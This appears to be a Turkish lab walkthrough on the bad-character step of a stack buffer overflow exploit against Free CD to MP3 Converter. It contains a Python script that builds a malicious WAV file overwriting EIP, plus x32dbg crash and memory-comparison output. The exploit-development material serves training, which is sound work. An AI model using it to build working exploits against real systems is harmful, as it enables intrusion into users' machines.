# Finding Bad Characters

## Generating Byte Array

Tüm karakterleri üretmek için aşağıda verilen komutu çalıştır:

```pwsh
Command: ERC --Bytearray
```

```output title="Output"
Byte Array:
--------------------------------
| 00 01 02 03 04 05 06 07 08 09 |
| 0A 0B 0C 0D 0E 0F 10 11 12 13 |
| 14 15 16 17 18 19 1A 1B 1C 1D |
| 1E 1F 20 21 22 23 24 25 26 27 |
| 28 29 2A 2B 2C 2D 2E 2F 30 31 |
| 32 33 34 35 36 37 38 39 3A 3B |
| 3C 3D 3E 3F 40 41 42 43 44 45 |
| 46 47 48 49 4A 4B 4C 4D 4E 4F |
| 50 51 52 53 54 55 56 57 58 59 |
| 5A 5B 5C 5D 5E 5F 60 61 62 63 |
| 64 65 66 67 68 69 6A 6B 6C 6D |
| 6E 6F 70 71 72 73 74 75 76 77 |
| 78 79 7A 7B 7C 7D 7E 7F 80 81 |
| 82 83 84 85 86 87 88 89 8A 8B |
| 8C 8D 8E 8F 90 91 92 93 94 95 |
| 96 97 98 99 9A 9B 9C 9D 9E 9F |
| A0 A1 A2 A3 A4 A5 A6 A7 A8 A9 |
| AA AB AC AD AE AF B0 B1 B2 B3 |
| B4 B5 B6 B7 B8 B9 BA BB BC BD |
| BE BF C0 C1 C2 C3 C4 C5 C6 C7 |
| C8 C9 CA CB CC CD CE CF D0 D1 |
| D2 D3 D4 D5 D6 D7 D8 D9 DA DB |
| DC DD DE DF E0 E1 E2 E3 E4 E5 |
| E6 E7 E8 E9 EA EB EC ED EE EF |
| F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 |
| FA FB FC FD FE FF             |
--------------------------------
```

Bu komut 2 adet dosya üretir:

1. C:\Users\htb-student\ByteArray_1.bin
2. C:\Users\htb-student\ByteArray_1.txt

Burada ByteArray_1.txt dosyasının içeriği aşağıda verilmiştir:

```pwsh
PS C:\Users\htb-student> Get-Content C:\Users\htb-student\ByteArray_1.txt
```

```output title="Output"
---------------------------------------------------------------------------------------
Byte Array generated at:4/9/2025 10:18:04 AM  Omitted values:
---------------------------------------------------------------------------------------

Raw:
\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B
\x0C\x0D\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17
\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x23
\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F
\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B
\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47
\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53
\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F
\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B
\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77
\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83
\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F
\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B
\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7
\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3
\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF
\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB
\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7
\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3
\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF
\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB
\xFC\xFD\xFE\xFF

C#:
byte[] buf = new byte[]
{
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
    0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
    0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
    0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
    0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
    0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
    0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
    0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
    0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
    0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
    0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
    0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
    0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
    0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
    0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
    0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
    0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
    0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
    0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
    0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
    0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
    0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
    0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
    0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
    0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
    0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
    0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
    0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
}
```

## Code

```python title="program.py" linenums="1" hl_lines="42"
def bad_chars():
    chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
        0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
        0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
        0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
        0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
        0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
        0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
        0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
        0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
        0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
        0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
        0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
        0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
        0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
        0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
        0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
        0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
        0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
        0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
        0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
        0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
        0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
        0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
        0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
        0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
        0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
        0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 4112

    buffer = b'A' * offset
    eip = b'B' * 4

    payload = buffer + eip + chars

    with open('bad.wav', 'wb') as f:
        f.write(payload)


bad_chars()
```

## Creating Sound File

```pwsh
PS C:\Users\htb-student> python .\program.py
```

## Fuzzing

Ses dosyasını Free CD to MP3 Converter üzerinde açmak için aşağıda verilen yolu takip et:

* Encode
* C:\Users\htb-student\bad.wav
* Open

Program crash verdi:

```text title="Paused"
First chance exception 42424242 (C0000005, EXCEPTION_ACCESS_VIOLATION)!
```

Ses dosyasına yazılan karakterler EIP register sonrasına eklenmişti.

ESP register değerini görüntüleyelim:

```nasm title="Registers" hl_lines="6"
EAX : 00000000
EBX : 41414141
ECX : 00001114
EDX : 00001114
EBP : 41414141
ESP : 0014F974
ESI : 41414141
EDI : 41414141
EIP : 42424242
EFLAGS : 00210216
ZF : 0
OF : 0
CF : 0
PF : 1
SF : 0
TF : 0
AF : 1
DF : 0
IF : 1
LastError : 00000000 (ERROR_SUCCESS)
LastStatus : C0000034 (STATUS_OBJECT_NAME_NOT_FOUND)
GS : 0000
ES : 0023
CS : 001B
FS : 003B
DS : 0023
SS : 0023
DR0 : 00000000
DR1 : 00000000
DR2 : 00000000
DR3 : 00000000
DR6 : 00000000
DR7 : 00000000
```

Bellekte bulunan girdi ile ByteArray_1.bin içeriğini kıyaslamak için aşağıda verilen komutu çalıştır:

```pwsh
Command: ERC --Compare 0014F974 C:\Users\htb-student\ByteArray_1.bin
```

```output title="Output" hl_lines="3-4"
Comparing memory region starting at 0x14F974 to bytes in file C:\Users\htb-student\ByteArray_1.bin
                   ----------------------------------------------------
        From Array | 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  |
From Memory Region | 00 38 09 00 68 24 09 00 A9 05 00 00 00 00 00 00  |
                   |                                                  |
        From Array | 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | 20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | 30 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | 40 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | 50 51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | 60 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | 70 71 72 73 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | 80 81 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | 90 91 92 93 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | A0 A1 A2 A3 A4 A5 A6 A7 A8 A9 AA AB AC AD AE AF  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | B0 B1 B2 B3 B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | C0 C1 C2 C3 C4 C5 C6 C7 C8 C9 CA CB CC CD CE CF  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | D0 D1 D2 D3 D4 D5 D6 D7 D8 D9 DA DB DC DD DE DF  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
        From Array | F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF  |
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |
                   |                                                  |
                   ----------------------------------------------------
```

Sekansı dikkatli incelersek, 0x00 karakterinden sonra 0x38 karakterinin geldiğini fark edebiliriz.

Bu durum, 0x00 karakterinin diğer tüm karakterleri kestiği anlamına gelir.

Yani 0x00 karakteri, bir kötü karakterdir.

## Eliminating Bad Characters

Kötü karakter elenecek.

Tüm karakterleri üretmek için aşağıda verilen komutu çalıştır:

```pwsh
Command: ERC --Bytearray -Bytes 0x00
```

```output title="Output" hl_lines="1 3"
Byte Array excluding: 00
--------------------------------
| 01 02 03 04 05 06 07 08 09 0A |
| 0B 0C 0D 0E 0F 10 11 12 13 14 |
| 15 16 17 18 19 1A 1B 1C 1D 1E |
| 1F 20 21 22 23 24 25 26 27 28 |
| 29 2A 2B 2C 2D 2E 2F 30 31 32 |
| 33 34 35 36 37 38 39 3A 3B 3C |
| 3D 3E 3F 40 41 42 43 44 45 46 |
| 47 48 49 4A 4B 4C 4D 4E 4F 50 |
| 51 52 53 54 55 56 57 58 59 5A |
| 5B 5C 5D 5E 5F 60 61 62 63 64 |
| 65 66 67 68 69 6A 6B 6C 6D 6E |
| 6F 70 71 72 73 74 75 76 77 78 |
| 79 7A 7B 7C 7D 7E 7F 80 81 82 |
| 83 84 85 86 87 88 89 8A 8B 8C |
| 8D 8E 8F 90 91 92 93 94 95 96 |
| 97 98 99 9A 9B 9C 9D 9E 9F A0 |
| A1 A2 A3 A4 A5 A6 A7 A8 A9 AA |
| AB AC AD AE AF B0 B1 B2 B3 B4 |
| B5 B6 B7 B8 B9 BA BB BC BD BE |
| BF C0 C1 C2 C3 C4 C5 C6 C7 C8 |
| C9 CA CB CC CD CE CF D0 D1 D2 |
| D3 D4 D5 D6 D7 D8 D9 DA DB DC |
| DD DE DF E0 E1 E2 E3 E4 E5 E6 |
| E7 E8 E9 EA EB EC ED EE EF F0 |
| F1 F2 F3 F4 F5 F6 F7 F8 F9 FA |
| FB FC FD FE FF                |
--------------------------------
```

## Updating the Code

Karakter dizisi değişti.

Kodun ilgili kısmını güncellemek gerekir:

```python title="program.py" linenums="2" hl_lines="2"
    chars = bytes([
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
        0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
        0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20,
        0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28,
        0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30,
        0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
        0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40,
        0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
        0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50,
        0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58,
        0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60,
        0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
        0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70,
        0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78,
        0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x80,
        0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88,
        0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F, 0x90,
        0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98,
        0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA0,
        0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8,
        0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0,
        0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8,
        0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0,
        0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8,
        0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF, 0xD0,
        0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8,
        0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF, 0xE0,
        0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8,
        0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF, 0xF0,
        0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8,
        0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])
```

## Creating Sound File (Again)

Ses dosyası debugger üzerinde açık.

Öncelikle x32dbg programını Restart ile yeniden başlat.

!!! failure

    Aksi halde dosya üzerine yazma başarısız olabilir.

Yeni bir ses dosyası üret:

```pwsh
PS C:\Users\htb-student> python .\program.py
```

## Program Crash

Ses dosyasını Free CD to MP3 Converter üzerinde açmak için aşağıda verilen yolu takip et:

* Encode
* C:\Users\htb-student\bad.wav
* Open

Program crash verdi:

```text title="Paused"
First chance exception 42424242 (C0000005, EXCEPTION_ACCESS_VIOLATION)!
```

ESP register değerini görüntüleyelim:

```nasm title="Registers" hl_lines="6"
EAX : 00000000
EBX : 41414141
ECX : 00001113
EDX : 00001113
EBP : 41414141
ESP : 0014F974
ESI : 41414141
EDI : 41414141
EIP : 42424242
EFLAGS : 00210216
ZF : 0
OF : 0
CF : 0
PF : 1
SF : 0
TF : 0
AF : 1
DF : 0
IF : 1
LastError : 00000000 (ERROR_SUCCESS)
LastStatus : C0000034 (STATUS_OBJECT_NAME_NOT_FOUND)
GS : 0000
ES : 0023
CS : 001B
FS : 003B
DS : 0023
SS : 0023
DR0 : 00000000
DR1 : 00000000
DR2 : 00000000
DR3 : 00000000
DR6 : 00000000
DR7 : 00000000
```

Bellekte bulunan girdi ile ByteArray_2.bin içeriğini kıyaslamak için aşağıda verilen komutu çalıştır:

```pwsh
Command: ERC --Compare 0014F974 C:\Users\htb-student\ByteArray_2.bin
```

!!! success

    Satırlar tam eşleşiyor. Kötü karakter kalmadı.

    Aksi halde devam etmek gerekir (ByteArray_3.bin, ByteArray_4.bin, ...):


    ```pwsh
    Command: ERC --Bytearray -Bytes 0x00,0x0A
    ```

    ```pwsh
    Command: ERC --Bytearray -Bytes 0x00,0x0A,0x0D
    ```

```output title="Output" hl_lines="3-4"
Comparing memory region starting at 0x14F974 to bytes in file C:\Users\htb-student\ByteArray_2.bin
                   ----------------------------------------------------
        From Array | 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10  |
From Memory Region | 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10  |
                   |                                                  |
        From Array | 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20  |
From Memory Region | 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20  |
                   |                                                  |
        From Array | 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30  |
From Memory Region | 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30  |
                   |                                                  |
        From Array | 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F 40  |
From Memory Region | 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F 40  |
                   |                                                  |
        From Array | 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50  |
From Memory Region | 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50  |
                   |                                                  |
        From Array | 51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F 60  |
From Memory Region | 51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F 60  |
                   |                                                  |
        From Array | 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70  |
From Memory Region | 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70  |
                   |                                                  |
        From Array | 71 72 73 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F 80  |
From Memory Region | 71 72 73 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F 80  |
                   |                                                  |
        From Array | 81 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F 90  |
From Memory Region | 81 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F 90  |
                   |                                                  |
        From Array | 91 92 93 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F A0  |
From Memory Region | 91 92 93 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F A0  |
                   |                                                  |
        From Array | A1 A2 A3 A4 A5 A6 A7 A8 A9 AA AB AC AD AE AF B0  |
From Memory Region | A1 A2 A3 A4 A5 A6 A7 A8 A9 AA AB AC AD AE AF B0  |
                   |                                                  |
        From Array | B1 B2 B3 B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF C0  |
From Memory Region | B1 B2 B3 B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF C0  |
                   |                                                  |
        From Array | C1 C2 C3 C4 C5 C6 C7 C8 C9 CA CB CC CD CE CF D0  |
From Memory Region | C1 C2 C3 C4 C5 C6 C7 C8 C9 CA CB CC CD CE CF D0  |
                   |                                                  |
        From Array | D1 D2 D3 D4 D5 D6 D7 D8 D9 DA DB DC DD DE DF E0  |
From Memory Region | D1 D2 D3 D4 D5 D6 D7 D8 D9 DA DB DC DD DE DF E0  |
                   |                                                  |
        From Array | E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF F0  |
From Memory Region | E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF F0  |
                   |                                                  |
        From Array | F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF     |
From Memory Region | F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF     |
                   |                                                  |
                   ----------------------------------------------------
```
